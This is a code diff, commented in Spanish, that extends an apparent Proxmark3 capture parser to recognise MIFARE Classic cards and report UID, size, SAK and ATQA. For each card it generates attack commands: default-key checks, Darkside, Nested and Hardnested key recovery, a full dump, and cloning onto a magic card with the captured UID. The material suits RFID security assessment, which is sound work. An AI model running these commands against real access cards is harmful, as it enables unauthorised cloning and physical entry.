@@ -56,6 +56,65 @@ class ProxmarkParser:
                 'lf t55xx dump',
             ]
 
+        elif 'MIFARE Classic' in self.raw or 'MF Classic' in self.raw or 'mfc' in self.raw.lower():
+            self.data['type'] = 'MIFARE Classic'
+            self.data['frequency'] = '13.56MHz'
+            self.data['protocol'] = 'ISO14443-A'
+
+            # UID - soporta formatos con y sin prefijos [=]
+            uid = re.search(r'(?:\[.?\]\s+)?UID[:\s]+([0-9A-Fa-f\s]{5,})', self.raw)
+            self.data['uid'] = uid.group(1).strip() if uid else None
+
+            # Detectar tamano 1K o 4K
+            if '4K' in self.raw or '4k' in self.raw:
+                self.data['size'] = '4K'
+            else:
+                self.data['size'] = '1K'
+
+            # SAK
+            sak = re.search(r'(?:\[.?\]\s+)?SAK[:\s]+([0-9A-Fa-f]+)', self.raw)
+            self.data['sak'] = sak.group(1).strip() if sak else None
+
+            # ATQA
+            atqa = re.search(r'(?:\[.?\]\s+)?ATQA[:\s]+([0-9A-Fa-f\s]+)', self.raw)
+            self.data['atqa'] = atqa.group(1).strip() if atqa else None
+
+            self.data['vulnerabilities'] = [
+                '[CRITICO] MIFARE Classic vulnerable a ataque Darkside (recuperacion de clave)',
+                '[CRITICO] Ataque Hardnested para sectores con claves desconocidas',
+                'Clonable en tarjeta MIFARE Classic en blanco o magic card',
+                'Claves por defecto (FFFFFFFFFFFF, A0A1A2A3A4A5) frecuentemente presentes',
+                'Sin autenticacion mutua - relay attack posible',
+                'Datos en sectores accesibles con claves crackeadas'
+            ]
+            uid_str = self.data['uid'].replace(' ', '') if self.data['uid'] else '11223344'
+            size_flag = '--4k' if self.data['size'] == '4K' else '--1k'
+            self.data['comandos'] = [
+                '# Informacion completa de la tarjeta',
+                'hf mf info',
+                '',
+                '# Probar claves por defecto en todos los sectores',
+                f'hf mf chk {size_flag} -f mfc_default_keys.dic',
+                '',
+                '# Ataque Darkside (recuperar primera clave)',
+                'hf mf darkside',
+                '',
+                '# Ataque Nested (con al menos una clave conocida)',
+                'hf mf nested --1k --ka --key ffffffffffff',
+                '',
+                '# Ataque Hardnested (clave desconocida, mas lento)',
+                'hf mf hardnested -t --tk ffffffffffff',
+                '',
+                '# Dump completo de la tarjeta (requiere todas las claves)',
+                f'hf mf dump {size_flag}',
+                '',
+                '# Clonar en magic card gen1a',
+                f'hf mf cload -f hf-mf-{uid_str}-dump.bin',
+                '',
+                '# Escribir UID en magic card',
+                f'hf mf wrbl --blk 0 -k ffffffffffff -d {uid_str}00000000000000000000000000000000',
+            ]
+
         elif 'MIFARE Plus' in self.raw:
             self.data['type'] = 'MIFARE Plus'
             self.data['frequency'] = '13.56MHz'
@@ -219,6 +278,14 @@ class ProxmarkParser:
         if self.data.get('chipset'):
             chipset = f"\nChipset        : {self.data['chipset']}"
 
+        sak = ''
+        if self.data.get('sak'):
+            sak = f"\nSAK            : {self.data['sak']}"
+
+        atqa = ''
+        if self.data.get('atqa'):
+            atqa = f"\nATQA           : {self.data['atqa']}"
+
         comandos = ''
         if self.data.get('comandos'):
             comandos = '\nComandos Proxmark3 sugeridos:\n' + '\n'.join([f'  {c}' for c in self.data['comandos']])
@@ -228,7 +295,7 @@ CAPTURA PROXMARK3 ANALIZADA
 Tipo           : {t}
 UID            : {uid}
 Frecuencia     : {freq}
-Protocolo      : {proto}{sl}{size}{chipset}{fingerprint}
+Protocolo      : {proto}{sl}{size}{chipset}{sak}{atqa}{fingerprint}
 
 Vulnerabilidades detectadas:
 {vulns}
